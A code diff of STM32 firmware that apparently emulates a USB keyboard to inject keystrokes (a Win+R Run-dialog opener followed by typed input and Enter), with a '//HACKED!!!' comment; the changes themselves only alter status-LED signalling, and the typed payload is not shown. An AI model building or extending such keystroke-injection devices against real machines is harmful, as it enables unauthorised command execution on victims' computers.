@@ -105,6 +105,7 @@ int main(void)
   MX_GPIO_Init();
   MX_USB_DEVICE_Init();
   /* USER CODE BEGIN 2 */
+  	  HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, SET);
   	  HAL_Delay(1000);
 	  keyboardhid.MODIFIER = 0x08;
 	  keyboardhid.KEYCODE1 = 0x15;
@@ -202,7 +203,6 @@ int main(void)
       HAL_Delay(20);
       keyboardhid.KEYCODE1 = 0x00;    //release l
       USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-      HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
 
       HAL_Delay(20);
 
@@ -211,7 +211,6 @@ int main(void)
       HAL_Delay(20);
       keyboardhid.KEYCODE1 = 0x00;    //release <Enter>
       USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
-      HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
 
       //----------------------------
       HAL_Delay(1000);
@@ -355,14 +354,17 @@ int main(void)
       keyboardhid.KEYCODE1 = 0x00;    //release <Enter>
       USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
 
+
+
+      //HACKED!!!
+      HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, RESET);
+
   /* USER CODE END 2 */
 
   /* Infinite loop */
   /* USER CODE BEGIN WHILE */
   while (1)
   {
-      HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
-      HAL_Delay(1000);
     /* USER CODE END WHILE */
 
     /* USER CODE BEGIN 3 */
